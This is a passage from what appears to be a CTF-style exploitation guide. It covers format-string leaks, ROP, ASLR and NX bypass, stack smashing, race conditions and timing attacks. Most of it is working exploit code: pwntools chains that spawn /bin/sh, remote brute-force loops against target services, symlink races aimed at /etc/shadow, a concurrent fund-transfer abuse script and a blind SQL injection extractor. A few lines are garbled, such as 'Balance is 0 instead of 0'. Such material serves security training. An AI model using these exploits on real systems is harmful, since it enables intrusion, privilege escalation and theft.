Null byte handling: `%n` cannot write null bytes directly; use alternative specifiers or multiple writes:

```bash
./vulnerable_program "ADDR%255x%6\$hhn"  # Writes 0xFF
```

ASLR bypass: Write to leak stack values to determine base addresses:

```bash
./vulnerable_program "%6\$08x.%7\$08x.%8\$08x"
# Output includes stack values used for ASLR calculation
```

#### Detection and Prevention

Enable compiler warnings for format string issues:

```bash
gcc -Wformat -Wformat-security source.c
```

Use static analysis tools:

```bash
clang --analyze source.c
```

Proper format string usage:

```c
// VULNERABLE
printf(user_input);

// SAFE
printf("%s", user_input);
printf("%.*s", max_length, user_input);
```

Runtime detection using format string sanitizers:

```bash
gcc -fsanitize=undefined source.c
```

### ROP (Return-Oriented Programming) Gadget Chains

Return-Oriented Programming exploits code reuse by chaining together existing code fragments (gadgets) that end in `ret` instructions. This technique bypasses code execution prevention (DEP/NX) by executing existing code in unintended sequences.

#### Understanding ROP Gadgets

A gadget is a short sequence of instructions ending with `ret`. By overwriting the stack return address, the attacker redirects execution to gadgets, which then set up the next gadget's return address.

Basic gadget example:

```asm
; Gadget 1: pop rax; ret
pop rax
ret

; Gadget 2: pop rbx; ret  
pop rbx
ret

; Gadget 3: syscall
syscall
```

Stack layout during ROP chain execution:

```
Stack (grows downward)
[Gadget 1 return address]
[Value for rax]
[Gadget 2 return address]
[Value for rbx]
[Gadget 3 return address]
```

When Gadget 1 executes `ret`, it pops the gadget 2 address and jumps there. Gadget 2 pops the value for rax, then returns to Gadget 3.

#### Identifying ROP Gadgets

Use ROPgadget to find gadgets in compiled binaries:

```bash
ROPgadget --binary /bin/bash > gadgets.txt
grep "pop rax" gadgets.txt
grep "syscall" gadgets.txt
```

Use Ropper for interactive gadget search:

```bash
ropper --file /bin/bash
ropper> search pop rax
ropper> search syscall
```

Use radare2 for detailed gadget analysis:

```bash
r2 /bin/bash
[0x00400000]> /m pop rax
[0x00400000]> /m syscall
```

#### Constructing ROP Chains

Objective: Call `execve("/bin/sh", NULL, NULL)` to spawn a shell.

System call number for execve on 64-bit Linux: 59

Required registers (x86-64 calling convention):

- rax = 59 (syscall number)
- rdi = pointer to "/bin/sh"
- rsi = NULL (argv)
- rdx = NULL (envp)

Find gadgets:

```bash
ROPgadget --binary /bin/bash | grep "pop rax"
ROPgadget --binary /bin/bash | grep "pop rdi"
ROPgadget --binary /bin/bash | grep "syscall"
```

Construct payload:

```python
from pwn import *

binary = ELF('/bin/bash')
rop = ROP(binary)

# Build ROP chain using pwntools
# pop rdi; ret
rop.call('pop rdi', [0x601048])  # Address of "/bin/sh" string
rop.call('pop rsi', [0])         # NULL
rop.call('pop rdx', [0])         # NULL
rop.call('pop rax', [59])        # execve syscall number
rop.call('syscall')

payload = b'A' * offset_to_return + rop.chain()
```

Manual ROP chain construction (without pwntools):

```python
import struct

# Gadget addresses (found via ROPgadget)
pop_rax = 0x400500
pop_rdi = 0x400501
pop_rsi = 0x400502
pop_rdx = 0x400503
syscall = 0x400504

# String "/bin/sh" address in binary or writable memory
binsh_addr = 0x601048

# Build stack-based ROP chain
chain = b''
chain += struct.pack('<Q', pop_rdi)
chain += struct.pack('<Q', binsh_addr)
chain += struct.pack('<Q', pop_rsi)
chain += struct.pack('<Q', 0)
chain += struct.pack('<Q', pop_rdx)
chain += struct.pack('<Q', 0)
chain += struct.pack('<Q', pop_rax)
chain += struct.pack('<Q', 59)
chain += struct.pack('<Q', syscall)

payload = b'A' * buffer_offset + chain
```

#### ROP Chain Exploitation in Practice

Vulnerable program with buffer overflow:

```c
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Buffer overflow
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

Compile with NX enabled:

```bash
gcc -z now -z relro -fPIE -pie -o vulnerable vulnerable.c
```

Exploit using ROP:

```python
#!/usr/bin/env python3
from pwn import *

# Start process
p = process('./vulnerable')

# Calculate offset to return address
offset = 72

# Create ROP chain
rop = ROP('./vulnerable')
rop.call('system', [next(rop.search(b'/bin/sh\x00'))])

# Build payload
payload = b'A' * offset + rop.chain()

# Send payload
p.sendline(payload)
p.interactive()
```

#### Bypassing ASLR with ROP

Leak addresses from the binary to calculate ASLR offsets:

```python
# Find puts function address
puts_got = elf.got['puts']
main_plt = elf.plt['main']

# Create information leak gadget
leak_chain = b'A' * offset
leak_chain += p64(pop_rdi_ret)
leak_chain += p64(puts_got)
leak_chain += p64(puts_plt)
leak_chain += p64(main_plt)  # Return to main for second payload

p.sendline(leak_chain)
leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))

# Calculate libc base
libc.address = leaked_puts - libc.symbols['puts']

# Now construct ROP chain with resolved addresses
```

#### Chaining Multiple Gadgets

Complex ROP chain executing multiple system calls:

```python
rop = ROP(binary)

# First: open("/etc/passwd", O_RDONLY)
rop(pop_rax, [2])         # open syscall
rop(pop_rdi, [passwd_addr])
rop(pop_rsi, [0])         # O_RDONLY
rop(pop_rdx, [0])
rop(syscall)

# Second: read(fd, buffer, size)
rop(pop_rax, [0])         # read syscall
rop(pop_rdi, [3])         # fd from previous syscall
rop(pop_rsi, [buffer_addr])
rop(pop_rdx, [1024])
rop(syscall)
```

#### ROP Gadget Limitations and Mitigations

[Inference] Modern systems employ Control Flow Guard (CFG) on Windows and Indirect Branch Tracking (IBT) on x86-64 Linux to prevent ROP exploitation by validating indirect branch targets. These mitigations make ROP exploitation significantly more difficult but not impossible.

ASLR makes ROP chains unreliable when gadget addresses are randomized; information leaks are necessary to determine base addresses.

Return-Oriented Programming often combines with other techniques:

- Information disclosure (read canaries, addresses, or function pointers)
- Heap exploitation (craft heap layout to leak liabilities)
- Format string (leak stack values to determine gadget addresses)

Mitigations include:

- Stack canaries (detect return address modification)
- ASLR (randomize code layout)
- CFG/IBT (validate branch targets)
- Shadow stack (shadow stack for return addresses)
- Hardware-enforced code integrity (Apple M1/M2 chips)

---

### ASLR Bypass Techniques

Address Space Layout Randomization (ASLR) randomizes memory addresses of executables, libraries, stack, and heap to prevent hardcoded exploit addresses. Bypass techniques leverage information disclosure, partial overwrites, or non-randomized regions for reliable exploitation.

#### Understanding ASLR Implementation

**Check ASLR Status:**

bash

```bash
# Linux system-wide ASLR
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled
# 1 = partial (stack, libraries, mmap randomized)
# 2 = full (stack, libraries, mmap, heap, VDSO randomized)

# Check binary PIE status
checksec --file=binary_sample
readelf -h binary_sample | grep Type
# DYN = PIE enabled, EXEC = PIE disabled
```

**Disable ASLR (Testing):**

bash

```bash
# Temporary (requires root)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Run single binary without ASLR
setarch $(uname -m) -R ./binary_sample

# GDB automatically disables ASLR
gdb binary_sample
(gdb) show disable-randomization  # Should show "on"
```

**Windows ASLR Check:**

cmd

```cmd
# Check if binary has ASLR enabled
dumpbin /headers binary.exe | findstr "Dynamic base"
# "Dynamic base" present = ASLR enabled

# PowerShell method
Get-Process | Select-Object Name,Id,@{Name="BaseAddress";Expression={$_.MainModule.BaseAddress}}
```

#### Information Leak Exploitation

**Format String Vulnerabilities for Leaks:**

c

```c
// Vulnerable code example
printf(user_input);  // Format string bug

// Exploitation technique
// Leak stack addresses
payload = "%p.%p.%p.%p.%p.%p"

// Leak specific address (6th stack position)
payload = "%6$p"

// Leak PIE base via GOT pointer
payload = "%7$s" + p64(got_address)
```

**Python Exploit Template:**

python

```python
from pwn import *

# Connect to target
p = remote('target', 1337)
# or: p = process('./binary')

# Leak address via format string
p.sendline(b'%3$p')
leak = p.recvline()
leaked_addr = int(leak.strip(), 16)
log.info(f"Leaked address: {hex(leaked_addr)}")

# Calculate base addresses
libc_base = leaked_addr - libc_offset
pie_base = leaked_addr - known_offset

log.success(f"Libc base: {hex(libc_base)}")
log.success(f"PIE base: {hex(pie_base)}")
```

**Buffer Over-read for Information Disclosure:**

python

```python
# Heartbleed-style over-read
# Read beyond buffer boundary to leak memory

payload = b'A' * buffer_size + p32(0xffffffff)  # Large size field
p.send(payload)
leaked_data = p.recv(4096)

# Parse leaked data for addresses
for i in range(0, len(leaked_data), 8):
    potential_addr = u64(leaked_data[i:i+8])
    if 0x7f0000000000 < potential_addr < 0x800000000000:
        log.info(f"Potential libc address: {hex(potential_addr)}")
```

#### Partial Overwrite Techniques

**Bypassing PIE with Partial Overwrite:**

python

```python
# PIE randomizes full address, but lower bits remain constant
# Example: PIE base 0x55555555000 + offset 0x123 = 0x555555555123
# Only need to overwrite 1.5 bytes to redirect to nearby function

# Original return address: 0x555555555400 (main)
# Target function:         0x555555555250 (win function)
# Only lower 1.5 bytes differ

payload = b'A' * offset
payload += p16(0x5250)  # Partial overwrite (12 bits known)

# Success probability: 1/16 (4 bits randomized in page offset)
# Brute force if necessary
```

**One-Byte Overwrite for Stack Pivot:**

python

```python
# Overwrite LSB of saved RBP to pivot stack
# Works when stack locations are predictable relative to each other

payload = b'A' * offset_to_rbp
payload += b'\x00'  # Change RBP to point lower in stack

# After function return, stack operations use modified RBP
# Allows controlled ROP chain execution
```

#### Return-to-PLT/GOT Techniques

**Leak via PLT/GOT:**

python

```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Stage 1: Leak libc address
rop.call('puts', [elf.got['puts']])
rop.call(elf.symbols['main'])  # Return to main for second exploit

payload = b'A' * offset
payload += rop.chain()

p.sendline(payload)

# Receive leaked address
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f"Leaked puts: {hex(leaked_puts)}")

# Calculate libc base
libc = ELF('./libc.so.6')
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")

# Stage 2: Execute system with known libc
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])

payload2 = b'A' * offset
payload2 += rop2.chain()
p.sendline(payload2)
```

**GOT Overwrite (No RELRO):**

python

```python
# If binary has no RELRO, GOT is writable
# Overwrite GOT entry to redirect function calls

# Example: Overwrite GOT[printf] with system address
write_got_payload = p64(elf.got['printf']) + p64(libc.symbols['system'])

# When printf is called with "/bin/sh", executes system("/bin/sh")
```

#### ret2dlresolve (Advanced ASLR Bypass)

**[Unverified]** ret2dlresolve exploits the dynamic linker's lazy binding mechanism to resolve arbitrary symbols without knowing library addresses, though implementation complexity varies by GLIBC version.

**Conceptual Approach:**

python

```python
# 1. Forge fake relocation entry
# 2. Forge fake symbol table entry  
# 3. Forge fake string table with "system"
# 4. Call _dl_runtime_resolve with forged structures

# Automated with pwntools
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.ret2dlresolve(dlresolve)

payload = b'A' * offset + rop.chain()
```

#### Brute Force ASLR

**32-bit ASLR Brute Force:**

python

```python
# 32-bit has limited entropy (typically 8-16 bits for libraries)
# Brute force becomes feasible

from pwn import *

attempts = 0
libc_base_guess = 0xf7500000  # Common libc base range

while True:
    attempts += 1
    try:
        p = remote('target', 1337, level='error')
        
        # Exploit with guessed address
        system_addr = libc_base_guess + system_offset
        payload = b'A' * offset + p32(system_addr) + p32(0) + p32(binsh_addr)
        
        p.sendline(payload)
        p.sendline(b'echo pwned')
        
        response = p.recvline(timeout=1)
        if b'pwned' in response:
            log.success(f"Success after {attempts} attempts!")
            log.success(f"Libc base: {hex(libc_base_guess)}")
            p.interactive()
            break
            
    except:
        pass
    
    p.close()
    libc_base_guess += 0x1000  # Try next page
```

**[Inference]** 64-bit ASLR brute force is generally impractical due to 28+ bits of entropy requiring millions of attempts, but may succeed against network services that don't restart on crash.

#### Stack Canary Bypass Combined with ASLR

**Leak Canary and Addresses:**

python

```python
# Stage 1: Leak canary via format string or over-read
p.sendline(b'%13$p')  # Leak canary position
canary = int(p.recvline().strip(), 16)

# Stage 2: Leak return address
p.sendline(b'%15$p')
ret_addr = int(p.recvline().strip(), 16)

# Calculate PIE base
pie_base = ret_addr - known_offset

# Stage 3: Overflow with leaked canary intact
payload = b'A' * offset_to_canary
payload += p64(canary)
payload += b'B' * 8  # Saved RBP
payload += p64(pie_base + gadget_offset)  # Controlled RIP
```

#### Environment Variable Leaks

**Leak Addresses from /proc:**

bash

```bash
# On Linux, process memory maps visible
cat /proc/self/maps

# Exploit: Read /proc/self/maps if file read primitive exists
# Parse output to find library base addresses
```

**Auxiliary Vector Leaks:**

c

```c
// Environment pointer follows argv
// Auxiliary vector follows environment
// AT_SYSINFO_EHDR, AT_PHDR contain kernel/binary addresses

char **envp = environ;
while(*envp++) ;  // Skip to auxiliary vector
Elf64_auxv_t *auxv = (Elf64_auxv_t *)envp;

// Parse auxv for address leaks
```

#### Heap Exploitation for ASLR Bypass

**Use-After-Free for Address Leak:**

python

```python
# Allocate object containing function pointer
chunk1 = malloc(0x80)

# Free chunk (function pointer remains in memory)
free(chunk1)

# Reallocate and read residual data
chunk2 = malloc(0x80)
leaked_ptr = read_from_chunk(chunk2, offset=0x10)

# Calculate heap/libc base from leaked pointer
```

**Fastbin/Tcache Metadata Leaks:**

python

```python
# Free chunks contain forward pointers
# Read freed chunk to leak heap addresses

free(chunk1)
leak = read(chunk1)  # Read FD pointer
heap_base = leak - known_heap_offset
```

---

### DEP/NX Bypass Techniques

Data Execution Prevention (DEP) / No-Execute (NX) marks memory regions as non-executable, preventing direct shellcode execution. Bypass techniques use existing executable code segments through ROP, ret2libc, or runtime memory permission changes.

#### Return-Oriented Programming (ROP)

**Basic ROP Chain Construction:**

python

```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Example: execve("/bin/sh", NULL, NULL) via syscall
# x64 syscall convention: rax=59, rdi=binsh, rsi=0, rdx=0

rop.rax = 59  # execve syscall number
rop.rdi = next(elf.search(b'/bin/sh\x00'))
rop.rsi = 0
rop.rdx = 0
rop.raw(rop.find_gadget(['syscall', 'ret']))

payload = b'A' * offset + rop.chain()
```

**Manual Gadget Finding:**

bash

```bash
# ROPgadget tool
ROPgadget --binary binary_sample --only "pop|ret"

# Find specific gadgets
ROPgadget --binary binary_sample --string "/bin/sh"
ROPgadget --binary binary_sample --opcode "syscall"

# radare2 gadget search
r2 -q -c '/R pop rdi; ret' binary_sample

# Ropper tool
ropper --file binary_sample --search "pop rdi"
```

**Common Gadget Patterns:**

python

```python
# x64 function call setup
pop_rdi = 0x400733  # pop rdi; ret
pop_rsi_r15 = 0x400731  # pop rsi; pop r15; ret

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(pop_rsi_r15)
payload += p64(0)  # rsi = NULL
payload += p64(0)  # r15 = junk
payload += p64(system_addr)
```

**x86 (32-bit) ROP:**

python

```python
# 32-bit uses stack for arguments
payload = b'A' * offset
payload += p32(system_addr)
payload += p32(exit_addr)  # Return address after system
payload += p32(binsh_addr)  # Argument to system
```

#### ret2libc Technique

**Classic ret2libc:**

python

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')

# Find gadgets and addresses
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))
exit_addr = libc.symbols['exit']

# Construct payload
payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

**ret2plt (No Libc Address Known):**

python

```python
# Use PLT entries (not randomized in non-PIE)
system_plt = elf.plt['system']

payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)  # Must find /bin/sh in binary
payload += p64(system_plt)
```

#### mprotect() for Shellcode Execution

**Change Memory Permissions:**

python

```python
# Call mprotect to make stack executable
# mprotect(addr, size, PROT_READ|PROT_WRITE|PROT_EXEC)

mprotect_addr = libc.symbols['mprotect']
stack_addr = 0x7ffffffde000  # Leaked/guessed stack address
prot_rwx = 7  # PROT_READ|PROT_WRITE|PROT_EXEC

rop = ROP(libc)
rop.call(mprotect_addr, [stack_addr, 0x21000, prot_rwx])
rop.raw(stack_addr + 0x100)  # Jump to shellcode location

payload = b'A' * offset
payload += rop.chain()
payload += b'\x90' * 0x100  # NOP sled
payload += shellcode
```

**mmap() for New Executable Region:**

python

```python
# mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)

mmap_addr = libc.symbols['mmap']
size = 0x1000
prot = 7
flags = 0x22  # MAP_PRIVATE|MAP_ANONYMOUS

rop.call(mmap_addr, [0, size, prot, flags, -1, 0])
# rax now contains new executable memory address
# Read shellcode to this address, then jump to it
```

#### SROP (Sigreturn-Oriented Programming)

**Sigreturn Frame Manipulation:**

python

```python
from pwn import *

context.arch = 'amd64'

# Create fake sigreturn frame
frame = SigreturnFrame()
frame.rax = 59  # execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget  # Address of syscall; ret
frame.rsp = writable_addr  # Stack pointer

# Trigger sigreturn
payload = b'A' * offset
payload += p64(pop_rax_ret)
payload += p64(15)  # rt_sigreturn syscall number
payload += p64(syscall_ret)
payload += bytes(frame)
```

**[Unverified]** SROP effectiveness varies by kernel version and requires a syscall gadget plus control over RAX register to invoke sigreturn.

#### JOP (Jump-Oriented Programming)

**Jump-Based Chain:**

python

```python
# Instead of ret instructions, use jmp/call
# Useful when ret instructions are filtered

# Example dispatcher gadget
# mov rax, [rsp]; jmp rax

payload = b'A' * offset
payload += p64(dispatcher_gadget)
payload += p64(gadget1)  # Will be jumped to
payload += p64(gadget2)
payload += p64(gadget3)
```

#### ret2csu (Universal Gadget)

**__libc_csu_init Gadgets:**

python

```python
# Present in most x64 binaries
# Allows setting rdi, rsi, rdx, rcx, r8, r9

# First gadget (setup registers)
csu_pop = 0x40089a  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret

# Second gadget (call function)
csu_call = 0x400880  # mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]

payload = b'A' * offset

# Setup for function call
payload += p64(csu_pop)
payload += p64(0)  # rbx = 0
payload += p64(1)  # rbp = 1 (loop counter)
payload += p64(got_entry)  # r12 = function pointer location
payload += p64(arg1)  # r13 = first argument
payload += p64(arg2)  # r14 = second argument
payload += p64(arg3)  # r15 = third argument
payload += p64(csu_call)
```

#### Stack Pivot Techniques

**Pivot to Controlled Memory:**

python

```python
# Change stack pointer to attacker-controlled buffer
# Useful when buffer is too small for full ROP chain

# Find pivot gadget
pivot_gadget = 0x400850  # xchg rax, rsp; ret

payload = b'A' * offset
payload += p64(pop_rax_ret)
payload += p64(bss_addr)  # Controlled writable memory
payload += p64(pivot_gadget)

# Separately write full ROP chain to bss_addr
# Chain executes after stack pivot
```

**Leave; Ret Pivot:**

python

```python
# leave = mov rsp, rbp; pop rbp
# Allows pivoting via RBP control

payload = b'A' * offset_to_rbp
payload += p64(fake_stack_addr - 8)  # New RBP
payload += p64(leave_ret_gadget)

# After leave executes:
# rsp = fake_stack_addr - 8
# ROP chain continues from fake_stack_addr
```

#### One-Gadget Exploitation

**Find One-Gadgets:**

bash

```bash
# Install one_gadget tool
gem install one_gadget

# Find one-shot execve gadgets in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Output example:
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
```

**Use One-Gadget:**

python

```python
# If constraints are satisfied, single address gives shell
one_gadget_offset = 0x4f3d5

payload = b'A' * offset
payload += p64(libc_base + one_gadget_offset)

# Simpler than full ROP chain if constraints met
```

#### Abusing Existing Code Paths

**ret2syscall:**

python

```python
# Chain gadgets to perform syscall directly
# No need for libc functions

rop = ROP(elf)
rop.rax = 59  # execve
rop.rdi = binsh_addr
rop.rsi = 0
rop.rdx = 0
rop.raw(syscall_ret)

payload = b'A' * offset + rop.chain()
```

**ret2dl-resolve:**

python

```python
# Resolve functions at runtime without knowing addresses
# Works even with full ASLR

# Automated approach
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=[binsh_addr])
rop.ret2dlresolve(dlresolve)

payload = b'A' * offset + rop.chain()
```

---

### SMASH the Stack Techniques

Stack smashing exploits buffer overflows to overwrite return addresses, function pointers, or control flow data on the stack. Classic exploitation technique forms the foundation for understanding memory corruption.

#### Basic Stack Overflow

**Vulnerable Code Pattern:**

c

```c
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking
    // Return address on stack can be overwritten
}
```

**Identify Offset to Return Address:**

python

```python
from pwn import *

# Generate cyclic pattern
pattern = cyclic(200)

# Send to program
p = process('./vuln')
p.sendline(pattern)
p.wait()

# Get crash information
core = p.corefile
rip = core.rip  # or core.eip for 32-bit

# Find offset
offset = cyclic_find(rip)
log.info(f"Offset to RIP: {offset}")
```

**Basic Exploitation:**

python

```python
payload = b'A' * offset
payload += p64(target_address)  # Overwrite return address

p.sendline(payload)
```

#### Stack Canary Bypass

**Canary Detection:**

bash

```bash
# Check if canary enabled
checksec --file=binary
# Stack Canary: Canary found/No canary found

# Disassembly shows canary checks
objdump -d binary | grep -A 5 "__stack_chk_fail"
```

**Brute Force Canary (Byte-by-Byte):**

python

```python
# Works if program doesn't restart on crash (fork server)
canary = b''

for i in range(8):
    for byte_val in range(256):
        payload = b'A' * offset_to_canary
        payload += canary + bytes([byte_val])
        
        p = remote('target', 1337)
        p.send(payload)
        
        response = p.recvall(timeout=1)
        if b'stack smashing detected' not in response:
            # Correct byte found
            canary += bytes([byte_val])
            log.info(f"Canary byte {i}: {hex(byte_val)}")
            break
        p.close()

log.success(f"Full canary: {canary.hex()}")
```

**Leak Canary via Format String:**

python

```python
# Canary stored on stack before return address
p.sendline(b'%13$p')  # Adjust offset to canary position
leaked_canary = int(p.recvline().strip(), 16)

payload = b'A' * offset_to_canary
payload += p64(leaked_canary)  # Preserve canary
payload += b'B' * 8  # Saved RBP
payload += p64(target_address)  # Overwrite RIP
```

**Overwrite Without Triggering Check:**

python

```python
# If function pointer exists before canary on stack
# Overflow to function pointer without reaching canary

payload = b'A' * offset_to_function_ptr
payload += p64(malicious_function)
# Stop before reaching canary
```

#### Frame Pointer Overwrite

**Saved RBP Manipulation:**

python

```python
# Overwrite saved RBP to control stack layout
# On function epilogue: mov rsp, rbp; pop rbp; ret
# Allows stack pivot or controlled crashes

payload = b'A' * offset_to_rbp
payload += p64(fake_rbp_value)
payload += p64(return_address)

# After leave instruction, RSP = fake_rbp_value
```

**Chain Multiple Overflows:**

python

```python
# First overflow: Modify RBP to point to buffer
# Second function call: Stack operations use attacker buffer

# Overflow 1
payload1 = b'A' * offset_to_rbp
payload1 += p64(buffer_address)
payload1 += p64(function2_address)

# Function2 uses buffer_address as stack
# Write ROP chain there beforehand
```

#### Off-by-One Overflow

**Null Byte Overflow:**

c

```c
void vuln(char *input) {
    char buffer[64];
    strncpy(buffer, input, sizeof(buffer));  // Off-by-one
    // NULL terminates one byte past buffer
}
```

**Exploitation:**

python

```python
# Overwrite LSB of saved RBP with NULL
# Changes RBP to point within current stack frame

payload = b'A' * 64  # Fill buffer completely
# strncpy writes NULL at buffer[64], overwriting LSB of RBP

# On next function return, manipulated RBP used
# Allows controlled stack layout
```

#### Stack Clash Exploitation

**[Inference]** Stack clash exploits abuse insufficient stack guard pages to cause stack/heap collision, though specific exploitation requires architecture-specific techniques and is less common in CTF scenarios.

**Conceptual Approach:**

c

```c
// Allocate large arrays to grow stack towards heap
void recursive_alloc(int depth) {
    char large_buffer[100000];
    if (depth > 0) {
        recursive_alloc(depth - 1);
    }
}
```

#### Overwriting Structured Exception Handlers (Windows)

**SEH Overwrite (x86 Windows):**

python

```python
# SEH chain on stack:
# [next SEH] [SEH handler]

# Overwrite SEH handler with pop; pop; ret gadget
# Then jump to shellcode

seh_offset = 100  # Offset to SEH record

payload = b'A' * seh_offset
payload += p32(next_seh)  # Next SEH (jump over handler)
payload += p32(pop_pop_ret)  # SEH handler (gadget address)
payload += shellcode

# When exception triggered, executes pop; pop; ret
# Then jumps to next_seh which reaches shellcode
```

#### Heap Overflow Affecting Stack

**Heap→Stack Corruption:**

python

```python
# Overflow heap buffer to overwrite function pointer
# Function pointer later pushed to stack for call

# Allocate objects in specific order
obj1 = malloc(100)  # Contains function pointer
obj2 = malloc(100)  # Overflow buffer

# Overflow obj2 to corrupt obj1's function pointer
overflow_payload = b'A' * 100 + p64(malicious_function)
write_to_obj2(overflow_payload)

# When obj1's function called, executes malicious_function
```

#### Automated Stack Exploitation

**pwntools Automation:**

python

```python
from pwn import *

context.binary = './vuln'
elf = context.binary

# Automatically find offset
io = gdb.debug('./vuln', 'continue')
io.sendline(cyclic(200))
io.wait()

core = Coredump('./core')
offset = cyclic_find(core.read(core.sp, 4))

# Build exploit
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])

io = process('./vuln')
io.sendline(fit({offset: rop.chain()}))
io.interactive()
```

---

### Important Related Subtopics

For comprehensive memory corruption exploitation coverage, investigate:

- **Heap exploitation techniques** (Use-after-free, double-free, heap spray, tcache poisoning)
- **Format string exploitation** (Arbitrary write, GOT overwrite, DTOR hijacking)
- **Integer overflow exploitation** (Signedness bugs, arithmetic wraparound)
- **Type confusion vulnerabilities** (C++ vtable hijacking, union type confusion)
- **Kernel exploitation basics** (ret2usr, SMEP/SMAP bypass, privilege escalation)

---

## Logic-Based Vulnerabilities

### Race Condition Exploitation

Race conditions occur when the outcome depends on the sequence or timing of uncontrollable events, typically in concurrent operations.

**TOCTOU (Time-Of-Check-Time-Of-Use)**

A classic race condition where a resource's state changes between checking and using it.

**File System TOCTOU Example**

```bash
# Vulnerable pattern in application:
# 1. Check if file exists and user has permission
# 2. Perform operation on file
# Race window exists between steps 1 and 2

# Exploitation script
#!/bin/bash
while true; do
    ln -sf /etc/passwd /tmp/userfile  # Point to sensitive file
    ln -sf /tmp/legitimate /tmp/userfile  # Point back to safe file
done &

# Run target application that checks then uses /tmp/userfile
./vulnerable_app
```

**Exploiting Race Conditions with Symbolic Links**

```bash
# Terminal 1: Rapid link switching
while true; do
    ln -sf /tmp/safe_file /tmp/target
    ln -sf /etc/shadow /tmp/target
done

# Terminal 2: Trigger vulnerable operation
./vulnerable_binary /tmp/target
```

**Multi-threaded Race Condition**

```python
import threading
import requests

# Exploit concurrent request handling
target_url = "http://target.com/transfer"

def send_request():
    data = {"from": "victim", "to": "attacker", "amount": 1000}
    requests.post(target_url, data=data)

# Launch many concurrent requests
threads = []
for i in range(100):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

**Race Condition Detection Tools**

```bash
# Using strace to observe timing
strace -T -tt ./binary

# Helgrind (Valgrind tool) for thread race conditions
valgrind --tool=helgrind ./binary

# ThreadSanitizer (compile-time)
gcc -fsanitize=thread -g program.c -o program
./program
```

**Exploiting Double-Fetch Vulnerabilities**

[Inference] Double-fetch occurs when kernel code fetches user-space data multiple times without proper locking:

```c
// Vulnerable kernel pattern (conceptual)
// First fetch: size check
copy_from_user(&size, user_ptr, sizeof(size));
if (size > MAX_SIZE) return -EINVAL;

// Race window here - attacker can modify user_ptr->size

// Second fetch: actual use
buffer = kmalloc(size);
copy_from_user(buffer, user_ptr->data, size);  // size may have changed
```

**Filesystem Race Condition Techniques**

```bash
# Exploit /tmp cleanup scripts
#!/bin/bash
TARGET="/tmp/exploit_dir"
mkdir $TARGET
chmod 777 $TARGET

while true; do
    # Wait for cleanup script to check directory
    sleep 0.001
    
    # Replace directory with symlink to root directory
    rm -rf $TARGET
    ln -s / $TARGET
done

# If cleanup script does: rm -rf /tmp/exploit_dir/*
# You might achieve arbitrary file deletion
```

**Database Race Conditions**

```sql
-- Exploiting non-atomic operations
-- Transaction 1:
SELECT balance FROM accounts WHERE id=123;  -- Returns 1000
-- Race window
UPDATE accounts SET balance=balance-500 WHERE id=123;

-- Transaction 2 (concurrent):
SELECT balance FROM accounts WHERE id=123;  -- Also returns 1000
-- Race window
UPDATE accounts SET balance=balance-500 WHERE id=123;

-- Result: Balance is 0 instead of 0, lost update
```

### Timing Attacks

Timing attacks exploit variations in execution time to extract sensitive information.

**Password Comparison Timing Attack**

```python
import requests
import time
import string

url = "http://target.com/check_password"
known = ""

# Exploit byte-by-byte comparison
for position in range(32):  # Assuming 32-char password
    best_char = None
    max_time = 0
    
    for char in string.printable:
        test_pass = known + char + "A" * (31 - position)
        
        # Measure response time
        times = []
        for _ in range(10):  # Multiple measurements
            start = time.perf_counter()
            requests.post(url, data={"password": test_pass})
            elapsed = time.perf_counter() - start
            times.append(elapsed)
        
        avg_time = sum(times) / len(times)
        
        if avg_time > max_time:
            max_time = avg_time
            best_char = char
    
    known += best_char
    print(f"Found so far: {known}")
```

**Blind SQL Injection Timing Attack**

```python
import requests
import time

def check_bit(bit_position, char_position):
    # Extract bit by bit using timing
    payload = f"admin' AND IF(ASCII(SUBSTRING(password,{char_position},1))&{1<<bit_position},SLEEP(5),0)-- -"
    
    start = time.time()
    requests.post(url, data={"username": payload})
    elapsed = time.time() - start
    
    return elapsed > 4  # True if sleep executed

def extract_password(length):
    password = ""
    for pos in range(1, length + 1):
        char_value = 0
        for bit in range(7):  # ASCII 7 bits
            if check_bit(bit, pos):
                char_value |= (1 << bit)
        password += chr(char_value)
        print(f"Extracted: {password}")
    return password
```

**Cryptographic Timing Attacks**

```python
# Exploit RSA decryption timing differences
import requests
import time
import statistics

def measure_decryption_time(ciphertext):
    times = []
    for _ in range(100):
        start = time.perf_counter()
        requests.post("http://target.com/decrypt", data={"ct": ciphertext})
        times.append(time.perf_counter() - start)
    
    # Remove outliers
    return statistics.median(times)

# Kocher's attack on RSA-CRT
# [Unverified] This is a simplified conceptual example
